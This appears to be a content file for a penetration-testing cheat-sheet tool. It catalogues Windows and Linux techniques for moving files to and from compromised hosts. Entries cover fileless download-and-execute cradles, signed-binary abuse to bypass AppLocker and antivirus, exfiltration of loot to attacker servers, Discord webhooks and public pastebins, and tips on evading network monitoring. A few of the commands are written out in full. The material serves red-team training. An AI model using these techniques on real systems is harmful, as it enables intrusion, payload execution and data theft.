techniques.label: PowerShell — Invoke-WebRequest
techniques.notes: Modern PowerShell (3.0+). The -UseBasicParsing flag prevents 'IE not configured' errors on fresh installs. UA contains 'WindowsPowerShell' so easily flagged by network monitoring.
techniques.ua: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.x
techniques.when: PowerShell 3.0+ available and HTTP outbound works. Default modern Windows download.

techniques.label: PowerShell — Net.WebClient.DownloadFile
techniques.notes: Works across all PowerShell builds (older boxes too). Faster than Invoke-WebRequest. File saved to disk — AV will scan on write.
techniques.ua: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.x
techniques.when: Any PowerShell version (works on legacy boxes where IWR fails). HTTP outbound works.

techniques.label: PowerShell — IEX cradle
techniques.notes: Classic fileless cradle. Script content lives only in memory, never touches disk. Only works for PowerShell scripts (.ps1), not binaries. AMSI inspects the content though, so signatures still apply.
techniques.ua: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.x
techniques.artifacts: AMSI inspects script body in memory; PS ScriptBlock log
techniques.when: You only need to RUN a PS script, not save it. Avoids disk writes (no AV scan on disk).

techniques.label: PowerShell — Msxml2.XMLHTTP cradle
techniques.notes: Same outcome as the IEX cradle but uses a different COM object — User-Agent looks like Internet Explorer 7, not PowerShell. Best stealth for PowerShell-based downloads.
techniques.ua: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0)
techniques.artifacts: Same AMSI/ScriptBlock logging as IEX — content scanned
techniques.when: Stealth matters — UA looks like IE7. Use when WindowsPowerShell UA would get flagged.

techniques.label: PowerShell — Start-BitsTransfer
techniques.notes: Uses Background Intelligent Transfer Service. Resumes interrupted downloads automatically. UA: 'Microsoft BITS/7.8' — easy to spot on the network.

techniques.label: PowerShell — iwr IEX cradle (PS 3.0+)
techniques.notes: Shorter PS 3.0+ alias for the IEX cradle using Invoke-WebRequest (this is the form in harmj0y's gist). On fresh installs you may need to add -UseBasicParsing to avoid the IE-not-configured error. Same UA and detectability as IWR — 'WindowsPowerShell' in the User-Agent.
techniques.ua: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.x

techniques.label: PowerShell — InternetExplorer.Application COM
techniques.notes: Spawns a real (hidden) Internet Explorer process to fetch the URL. The User-Agent on the wire is the actual installed IE's UA (typically IE11 on Win10/11) — most stealthy of the COM cradles. Downsides: slow (5-sec sleep), flaky if IE first-launch isn't complete, IE COM is being phased out.

techniques.label: PowerShell — WinHttp.WinHttpRequest cradle
techniques.notes: Medium-stealth IEX cradle using the WinHttp COM object. UA reveals the WinHttp library, not PowerShell. Note: NOT proxy-aware (skips system proxy settings).

techniques.label: PowerShell — DNS TXT cradle
techniques.notes: Payload encoded as base64 in a DNS TXT record, fetched via nslookup. No HTTP traffic at all — bypasses HTTP-only egress filters. Replace {ip} with the domain that serves the TXT record. Originally from PowerBreach.

techniques.label: cmd — curl (Windows 10+)
techniques.notes: Real curl is bundled with Windows 10 (build 17063+) and Windows 11. Cleanest cmd-native syntax.

techniques.label: cmd — certutil -urlcache
techniques.notes: Classic Windows LOLBIN. AMSI/Defender flags this in modern environments but works in less-monitored contexts. UA: 'Microsoft-CryptoAPI/10.0' — easy to detect on the network.
techniques.artifacts: Cache in CryptnetUrlCache\; Defender Event ID 1116
techniques.when: PowerShell is blocked but cmd.exe works. Caveat: AMSI flags this in modern environments.

techniques.label: cmd — bitsadmin /transfer
techniques.notes: Background Intelligent Transfer Service via cmd. Resumes interrupted downloads. UA: 'Microsoft BITS/7.8'. Marked deprecated by Microsoft in favor of PowerShell BITS cmdlets.
techniques.when: PowerShell blocked, certutil flagged. BITS is built-in and often less monitored.

techniques.label: cmd — Desktopimgdownldr
techniques.notes: Windows 10 wallpaper-download utility abused as downloader. Uses BITS COM under the hood — actual TCP comes from svchost. File lands in lockscreen image cache; move/rename after. Useful when standard download tools blocked.

techniques.label: cmd — mshta from URL
techniques.notes: Executes HTA file from URL in memory. Filename should end in .hta and contain HTML+VBS/JS. Microsoft-signed binary — often allowed by AppLocker. Used in many APT chains.
techniques.artifacts: Process tree: mshta.exe with HTTP URL on cmdline

techniques.label: cmd — regsvr32 Squiblydoo
techniques.notes: Squiblydoo bypass. Filename must be a .sct (COM scriptlet) containing JS or VBS. Classic AppLocker bypass. Now blocked by default Defender ASR rules in modern Windows — works on unmanaged endpoints.
techniques.artifacts: regsvr32.exe loading scrobj.dll + outbound URL on cmdline

techniques.label: cscript — wget.js (JavaScript)
techniques.notes: JavaScript download cradle via cscript. Uses ActiveX (WinHttp.WinHttpRequest + ADODB.Stream) to fetch and save the URL. cscript.exe is Microsoft-signed and rarely AppLocker-blocked. Used in the Astaroth APT chain.

techniques.label: cscript — wget.vbs (VBScript)
techniques.command:
REM === Save the following as wget.vbs ===
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with

REM === Then run: ===
cscript.exe /nologo wget.vbs http://{ip}:{port}/{filename} {win_out}
techniques.notes: VBScript download cradle via cscript. Same ActiveX approach as the JS version (Microsoft.XMLHTTP + ADODB.Stream). VBScript has been on every Windows since 98 — useful when JS is blocked but VBS isn't.

techniques.label: curl
techniques.notes: Universal HTTP client on most Linux distros. Lowercase -o sets output path.
techniques.when: Modern Linux with curl installed. Default first try.

techniques.label: wget
techniques.notes: The other universal Linux HTTP client. Uppercase -O sets output path (different from curl).
techniques.when: curl is missing but wget is installed (e.g., older distros).

techniques.label: curl | bash
techniques.notes: Linux fileless cradle. Pipes the downloaded script directly into bash for execution. Nothing hits disk. Works for any shell script.
techniques.when: You only need to EXECUTE a script, not save it. Fileless — bypasses on-disk AV scans.

techniques.label: bash /dev/tcp
techniques.notes: Last resort — bash itself can do TCP. Includes sed cleanup to strip HTTP headers. Slow but works on stripped systems with bash 2.04+ (Alpine, distroless, hardened boxes).
techniques.when: Last resort — curl, wget, python all missing. Bash 2.04+ has TCP built in (Alpine, distroless).

techniques.label: busybox wget
techniques.notes: Use when on Alpine or busybox-only container. busybox's multi-call binary provides a minimal wget when GNU wget is missing.

techniques.label: socat — TCP file pull
techniques.notes: Alternative to nc with more flexibility. Server side: socat -u OPEN:{filename} TCP-LISTEN:{port},reuseaddr

techniques.label: ncat — TLS-encrypted
techniques.notes: TLS-wrapped nc. Use when traffic inspection is a concern. Server: ncat --ssl --send-only -lnvp {port} < {filename}

techniques.label: Python 3 — urllib
techniques.notes: Use when curl and wget are missing. Python 3 is on most modern Linux. Note: target needs python3 installed (check with 'which python3').

techniques.label: Python 3 — exec from URL
techniques.notes: Equivalent of the PowerShell IEX cradle for Python scripts. Downloads and exec()s in memory. Works for any Python source code, on any OS with python3 installed.

techniques.label: Python 2 — urllib (legacy)
techniques.notes: Python 2 reached EOL in 2020 but you'll still find it on legacy boxes. Note the slightly different API: 'urllib' (not 'urllib.request') and 'urlretrieve' lives directly on urllib.

techniques.label: PHP — file_get_contents
techniques.notes: PHP is installed on most web servers. Reads the entire file into memory — bad for files > a few MB. Use the fopen variant for streaming.
techniques.when: You compromised a web server already running PHP. Use what is already there.

techniques.label: PHP — @file pipe to bash
techniques.notes: PHP fileless cradle — fetches a shell script and pipes straight to bash. Useful when you have RCE on a web server but no curl/wget.

techniques.label: Ruby — Net::HTTP
techniques.notes: Ruby ships on macOS and many Linux distros (especially anything with Metasploit, Rails, or Chef). Built-in net/http — no gems needed.

techniques.label: Perl — LWP::Simple
techniques.notes: Cleanest Perl one-liner. Requires LWP::Simple module — present on most Perl installs but missing from minimal perl-base. If unavailable, fall back to raw IO::Socket::INET.
techniques.when: curl/wget/python missing but Perl is installed (older Unix-style boxes).

techniques.label: Node.js — http.get
techniques.notes: Node.js is common on dev/CI/build boxes. Uses built-in http module — no npm packages needed. For HTTPS, swap require('http') for require('https').

techniques.label: base64 paste-through
techniques.command:
# === On attacker (Linux) ===
cat {filename} | base64 -w 0; echo

# === On Windows target ===
[IO.File]::WriteAllBytes("{win_out}", [Convert]::FromBase64String("PASTE_BASE64_HERE"))

# === On Linux target ===
echo -n 'PASTE_BASE64_HERE' | base64 -d > {nix_out}

# Verify both sides:
# Linux:    md5sum {filename}
# Windows:  Get-FileHash {win_out} -Algorithm MD5
techniques.notes: When no network transfer works. Encode on one side, paste through the shell, decode on the other. Limit: cmd.exe has 8191-char line max so files >~500KB will be truncated.
techniques.when: No network at all — only terminal access (web shell, blind RCE). Files under ~500KB only.

techniques.label: xxd hex paste-through
techniques.command:
# === On attacker ===
xxd -p {filename} | tr -d '\n'; echo

# === On target ===
echo 'PASTE_HEX_HERE' | xxd -r -p > {nix_out}

# Verify both sides with md5sum
techniques.notes: Alternative to base64 when base64 is mangled by the shell or filtered. xxd is on most Linux distros.

techniques.label: curl POST -F (multipart upload)
techniques.notes: Upload to Python uploadserver or any multipart-form endpoint. {filename} is the source path on target (e.g. /etc/passwd).

techniques.label: curl PUT -T (WebDAV upload)
techniques.notes: HTTP PUT upload. Requires server with WebDAV PUT support (e.g. nginx with dav_methods PUT, or wsgidav).
techniques.usage: # nginx WebDAV PUT recipe — see srv_nginx_put in Extras

techniques.label: scp — push to attacker
techniques.notes: SSH-based encrypted upload. Replace 'user' with the SSH username on your attacker box. Requires SSH server running on port 22 (or pass -P for custom port).
techniques.usage:
# Ensure attacker SSH server is running:
sudo systemctl start ssh

techniques.label: Python 3 — requests POST upload
techniques.notes: Uses the requests module. Falls back nicely when curl is missing but python3 + requests is installed.

techniques.label: nc — push to attacker
techniques.notes: Send file from target to attacker via netcat. Attacker side: nc -lvnp {port} > received. -q 0 closes the connection on EOF (use --send-only with ncat instead).
techniques.when: Need to push file from target to attacker, no HTTP server available, raw TCP works.

techniques.label: PowerShell — PSUpload
techniques.notes: PowerShell has no built-in HTTP upload. PSUpload provides Invoke-FileUpload. Loads the script via IEX cradle. Server side: python3 -m uploadserver
techniques.ua: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.x

techniques.label: PowerShell — IWR PUT
techniques.notes: HTTP PUT upload from PowerShell. Server side: nginx with dav_methods PUT, or wsgidav.
techniques.ua: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.x
techniques.usage: # nginx WebDAV PUT recipe — see srv_nginx_put in Extras

techniques.label: cmd — certreq -Post (LOLBIN upload)
techniques.notes: LOLBIN designed for submitting cert requests over HTTP. Expect a 'timed out' response on the target — there's no CA listening — but the POST body still reaches your nc listener. Server side: nc -lvnp {port}. UA: 'NDES client' — looks legitimate.
techniques.when: Windows upload when no other channel works. Microsoft-signed, "NDES client" UA looks legit.

techniques.label: transfer.sh (public pastebin)
techniques.notes: Uploads to public file pastebin. Returns a shareable URL on stdout you can fetch from anywhere. Files expire after ~14 days. Useful when you can't host your own server (egress-limited target).

techniques.label: 0x0.st (public pastebin)
techniques.notes: Uploads to public file pastebin. Returns a shareable URL on stdout. Smaller files expire after months, larger files after a year. Anonymous, no signup.

techniques.label: cmd — SMB copy (UNC path)
techniques.notes: Classic SMB file copy via UNC path. Server side: impacket-smbserver. Recent Windows defaults reject anonymous guest SMB — if you see that error, mount the share with credentials first: net use n: \\{ip}\share /user:test test, then copy n:\{filename}.
techniques.when: HTTP outbound is blocked but TCP/445 (SMB) works. Often the case in restricted networks.

techniques.label: cmd — WebDAV copy (UNC over HTTP)
techniques.notes: Looks like SMB but rides over HTTP/80 — bypasses TCP/445 outbound blocks. Server side: sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous. The magic 'DavWWWRoot' path triggers Windows to switch to WebDAV when SMB isn't reachable.
techniques.when: TCP/445 (SMB) outbound is BLOCKED but HTTP/80 works — WebDAV rides over HTTP via UNC paths.

techniques.label: cmd — FTP command file
techniques.command:
echo open {ip} > ftp.txt
echo USER anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET {filename} >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
techniques.notes: When only a non-interactive shell is available — build a script file then run ftp -s:. Always include 'binary' mode for non-text files (ASCII mode mangles binaries). Server side: sudo python3 -m pyftpdlib --port 21.

techniques.label: cmd — GfxDownloadWrapper (Intel LOLBIN)
techniques.notes: Intel Graphics Driver utility. Pre-installed on most Intel-based laptops. INTEL-signed (not Microsoft) — bypasses AppLocker rules that allow only Microsoft. Almost no defender monitors graphics driver utilities.
techniques.when: AppLocker permits Microsoft-signed binaries but blocks PowerShell. Intel-signed LOLBIN — almost no defenders monitor it.

techniques.label: cmd — esentutl /y (SMB LOLBIN)
techniques.notes: Extensible Storage Engine utility abused for SMB copy. Source must be an SMB share, not HTTP. Less monitored than copy/SMB tools. /y = copy, /d = destination, /o = overwrite.

techniques.label: PowerShell — PSSession Copy-Item -ToSession
techniques.notes: Lateral movement via WinRM (port 5985). Pushes a file from your current host to a remote PSSession. Requires admin on target OR membership in 'Remote Management Users' group. Add -Credential (Get-Credential) for explicit creds.

techniques.label: PowerShell — PSSession Copy-Item -FromSession
techniques.notes: Pull file from remote PSSession (WinRM port 5985) to your local host. Use this for exfilling files from a target you already have a PSSession on. Same auth requirements as -ToSession.

techniques.label: openssl s_client — TLS file pull
techniques.notes: TLS-encrypted file transfer. Looks like generic HTTPS on the wire — no actual HTTP. Server side: openssl s_server -quiet -accept {port} -cert cert.pem -key key.pem < FILE. Pre-generate cert: openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem -subj '/CN=server'.
techniques.usage:
openssl s_server -quiet -accept {port} -cert cert.pem -key key.pem < {filename}
# Generate cert: openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem -subj "/CN=server"

techniques.label: Discord webhook upload
techniques.notes: Posts file to a Discord channel via webhook. Free, no own infrastructure needed, traffic blends into legit Discord HTTPS. Setup: in Discord, channel settings → Integrations → Webhooks → New Webhook. Replace <WEBHOOK_ID>/<TOKEN> with the URL Discord gives you. Heavily abused by info-stealers.

techniques.label: PowerShell — Net.WebClient.DownloadFileAsync
techniques.notes: Non-blocking variant of DownloadFile — returns immediately and downloads in background. Useful for large files or starting parallel transfers without waiting.
techniques.ua: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.x

techniques.label: PowerShell — Net.WebClient FTP download
techniques.notes: PowerShell-native FTP via WebClient — no need for ftp.exe. Anonymous by default. For credentials: `$wc = New-Object Net.WebClient; $wc.Credentials = New-Object System.Net.NetworkCredential('user','pass'); $wc.DownloadFile(...)`. FTP control on TCP/21 is often blocked outbound — test reachability first.

techniques.label: PowerShell — Net.WebClient FTP upload
techniques.notes: Push local file to FTP server. First arg = remote URI (filename to write on server), second arg = local source path. Server side: sudo python3 -m pyftpdlib --port 21 --write (allow anonymous writes).

techniques.label: PowerShell — base64 + IWR POST to nc
techniques.notes: Scrappy upload when no real server is available — POST base64-encoded file to a netcat listener. Attacker side: `nc -lvnp {port}` then decode with `echo <PASTE> | base64 -d > out`. Use -Encoding Byte for binary integrity.
techniques.ua: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.x

techniques.label: cmd — SMB upload (UNC path)
techniques.notes: Push file from target to attacker SMB share. Server side: sudo impacket-smbserver share -smb2support /tmp/smbshare. With auth: net use n: \\{ip}\share /user:test test, then copy {filename} n:\.

techniques.label: cmd — WebDAV upload (UNC over HTTP)
techniques.notes: Upload via WebDAV — looks like SMB but rides over HTTP/80. Bypasses TCP/445 outbound blocks. Server side: sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous (mark share as Read-Write).

techniques.label: cmd — FTP command file (PUT)
techniques.command:
echo open {ip} > ftp.txt
echo USER anonymous >> ftp.txt
echo binary >> ftp.txt
echo PUT {filename} >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
techniques.notes: Upload variant of the FTP script — same structure with PUT instead of GET. Always include 'binary' to avoid ASCII-mode mangling. Server side: sudo python3 -m pyftpdlib --port 21 --write.

techniques.label: cmd — SMB copy with auth (net use)
techniques.command:
net use n: \\{ip}\share /user:test test
copy n:\{filename} {win_out}
techniques.notes: Modern Windows blocks unauthenticated guest SMB. Mount with explicit credentials first, then copy. Server side: sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test. Drive letter 'n:' is arbitrary.
techniques.when: SMB works but modern Windows refuses anonymous guest access. Server needs auth credentials.

techniques.label: scp — pull from attacker
techniques.notes: Pull file from attacker SSH server to target. Encrypted, authenticated, perms preserved. Replace 'user' with your SSH username. For non-default port: scp -P PORT user@host:/path file. SSH outbound (TCP/22) is usually allowed.
techniques.usage:
# Ensure attacker SSH server is running:
sudo systemctl start ssh

techniques.label: wget -qO- | bash (fileless)
techniques.notes: wget version of curl|bash. -q quiet, -O- output to stdout, then pipe to bash (or python3, etc.) for fileless execution. Caveat: payloads using mkfifo still create temp files on disk.

techniques.label: PHP — fopen streaming download
techniques.command: php -r 'const BUFFER = 1024; $fr = fopen("http://{ip}:{port}/{filename}", "rb"); $fl = fopen("{nix_out}", "wb"); while ($b = fread($fr, BUFFER)) { fwrite($fl, $b); } fclose($fl); fclose($fr);'
techniques.notes: Streaming download — reads in 1KB chunks instead of loading whole file into memory like file_get_contents(). Use this for large files. Requires PHP fopen URL wrappers enabled (default on most installs).

techniques.label: Perl — IO::Socket::INET (raw)
techniques.notes: Raw socket fallback — use when LWP::Simple isn't installed (minimal perl-base systems). Builds the HTTP GET manually. sed strips response headers.

techniques.label: nc listen — receive from attacker
techniques.notes: Target listens, attacker pushes the file. Use when target is reachable inbound (CTF labs, exposed services). Attacker side: nc -q 0 {ip} {port} < {filename} (or with ncat: ncat --send-only {ip} {port} < {filename}).
techniques.usage:
# Attacker pushes file to listening target:
nc -q 0 {ip} {port} < {filename}

techniques.label: xfreerdp — RDP drive mount
techniques.notes: Mount a local Linux folder into the RDP session. Inside Windows, access via \\tsclient\share — drag files in either direction. Caveat: Defender on YOUR side may delete malware in the shared dir.

techniques.label: rdesktop — RDP disk mount
techniques.notes: Older alternative to xfreerdp. Same \\tsclient\share pattern inside the RDP session for bidirectional file transfer.

techniques.label: bash /dev/tcp — raw TCP receive
techniques.notes: Raw bash TCP client — no HTTP, just bytes. Pairs with a netcat sender on attacker (nc -l -p {port} -q 0 < {filename}). Use when target has no nc but bash 2.04+ is present. Different from /dev/tcp HTTP form (which builds a GET request).

techniques.label: openssl — AES-256 encrypt
techniques.notes: Encrypt before transfer over plaintext channels (HTTP/FTP/nc). CRITICAL: always include -pbkdf2 — without it, openssl uses single-round MD5 derivation (trivially brute-forceable). Use -iter 100000 to slow down attackers further. Use a unique strong password per engagement.
techniques.when: Loot is sensitive (creds, NTDS, /etc/shadow). Encrypt before transferring over plaintext channels.

techniques.label: openssl — AES-256 decrypt
techniques.notes: Counterpart to encrypt. Same flags must match (-aes256, -iter, -pbkdf2). After decrypt + verify, shred the encrypted artifact: shred -u {filename}.enc.

techniques.label: PowerShell — Invoke-AESEncryption encrypt
techniques.notes: AES-256-CBC. Output file gets .aes extension. Download Invoke-AESEncryption.ps1 to target first. Key derivation = SHA-256 of UTF-8 password. Use unique strong keys per engagement to limit blast radius if a key leaks.

techniques.label: PowerShell — Invoke-AESEncryption decrypt
techniques.notes: Decrypt counterpart. Output drops the .aes extension. Same key required as encryption. Mode Encrypt also accepts -Text for short string secrets (returns base64).

techniques.label: server — python http.server
techniques.notes: Quickest HTTP file server — serves current directory. No upload support (download only). Run from the directory containing the file you want to serve.
techniques.when: Quick basic HTTP server in current directory. No upload, no auth, no HTTPS — for fast download-only use.

techniques.label: server — python uploadserver (HTTP+upload)
techniques.notes: http.server + upload endpoint at /upload. HTTPS variant: sudo python3 -m uploadserver 443 --server-certificate ~/server.pem (generate cert: openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'). Don't host the cert in the served directory.

techniques.label: server — impacket-smbserver
techniques.notes: SMB server for Windows targets. Anonymous by default — modern Windows blocks anonymous guest, so use auth: sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test. Then on target: net use n: \\IP\share /user:test test.
techniques.when: Windows targets that need SMB. Anonymous works on older Windows; use auth variant for modern Windows.

techniques.label: server — pyftpdlib FTP
techniques.notes: FTP server with anonymous read+write. Default port without --port flag is 2121. Install: sudo pip3 install pyftpdlib --break-system-packages. Drop --write for read-only.

techniques.label: server — wsgidav (WebDAV)
techniques.notes: WebDAV server — Windows clients can use SMB-style UNC paths over HTTP (\\IP\DavWWWRoot\). Bypasses TCP/445 blocks. Install: sudo pip3 install wsgidav cheroot --break-system-packages. Anonymous = read+write on /tmp.

techniques.label: server — openssl s_server (TLS)
techniques.notes: TLS file sender — pairs with `openssl s_client -connect IP:PORT -quiet > out` on target. Looks like generic HTTPS on the wire. Generate cert first: openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem -subj '/CN=server'.

techniques.label: server — nc receiver
techniques.notes: Catch a file from a netcat sender on target. Pair with nc -q 0 {ip} {port} < {filename} or ncat --send-only on target. Strip protocol overhead — raw TCP only.

techniques.label: server — nginx WebDAV PUT
techniques.notes: Persistent nginx server accepting PUT uploads. Better than python uploadserver for production-grade catching. Port 80 conflict on Pwnbox? sudo rm /etc/nginx/sites-enabled/default. Upload from target: curl -T file http://IP:PORT/SecretUploadDirectory/file.

techniques.label: cmd — findstr /V via SMB UNC
techniques.notes: findstr is for searching strings — abused here as a copy mechanism. /V dummy = print all lines NOT matching 'dummy' (i.e., the whole file). Source must be SMB UNC, not HTTP. Less monitored than copy/SMB.
techniques.when: AppLocker blocks copy.exe but allows other Microsoft-signed binaries. Or you want a less common SMB-grab signature.

techniques.label: cmd — Hh.exe (HTML Help)
techniques.notes: hh.exe is the HTML Help viewer. Fetches a URL and renders the content as HTML help. With a malicious .htm payload, this becomes execution. Microsoft-signed, very obscure.
techniques.when: AppLocker permits hh.exe (default Windows Help viewer is rarely blocked). Useful for code execution from URL more than file save.

techniques.label: cmd — Replace.exe via SMB UNC
techniques.notes: replace.exe normally replaces files in a destination directory. /A flag adds source files that don't exist in the destination — turns it into a copy. SMB UNC source. Microsoft-signed, rarely monitored.
techniques.when: Less common SMB copy alternative. Use when copy.exe / esentutl / xcopy are watched but replace.exe isn't.

techniques.label: cmd — MpCmdRun (Defender download)
techniques.notes: Microsoft Defender's own download utility — abused to fetch arbitrary files. Microsoft-signed, AV almost never monitors its own binary. The Platform path contains a version-numbered folder that changes with Defender updates — discover it with 'dir /B' or 'where /R C:\ProgramData MpCmdRun.exe'.
techniques.when: Defender is installed (most enterprise Windows). You're avoiding PowerShell/certutil which are flagged. MpCmdRun is the AV itself — defenders rarely watch it.

techniques.label: cmd — msxsl (XSL transform LOLBIN)
techniques.notes: Microsoft XSL Transformations utility. Fetches an XML doc + an XSL stylesheet from URL and writes the transformed output to disk. Use for code execution or to fetch+process remote content. Note: msxsl.exe isn't in default Windows — must be downloaded from Microsoft, but is signed.
techniques.when: Target has msxsl.exe present (some legacy enterprise installs). You want a download path that goes through XSL transformation — useful for fileless execution variants.

techniques.label: cmd — extrac32 (CAB from SMB)
techniques.notes: Built-in Windows CAB extraction tool. Accepts SMB UNC source. Less commonly monitored than copy.exe / esentutl. Source must be a .cab file (or expand-able archive). Microsoft-signed.
techniques.when: AppLocker / EDR is watching copy.exe and esentutl but missed extrac32. Or you're packaging payloads as CAB anyway.

techniques.label: cmd — MSBuild (csproj from WebDAV)
techniques.notes: Microsoft Build Engine — fetches + compiles + executes a .csproj file containing inline C# tasks. Microsoft-signed, ships with .NET on every modern Windows, allowed by AppLocker. The \\IP@PORT\share\file syntax is WebDAV-over-UNC, so it works over HTTP/80 even when SMB/445 is blocked outbound. Heavily used in modern C2 (Covenant, Donut). No disk write — payload runs via WebDAV redirector.
techniques.when: AppLocker blocks PowerShell + scripts but allows .NET Framework binaries (the default lockdown on hardened Windows). MSBuild is the canonical bypass — Microsoft-signed, build-toolchain category, almost never blocked.
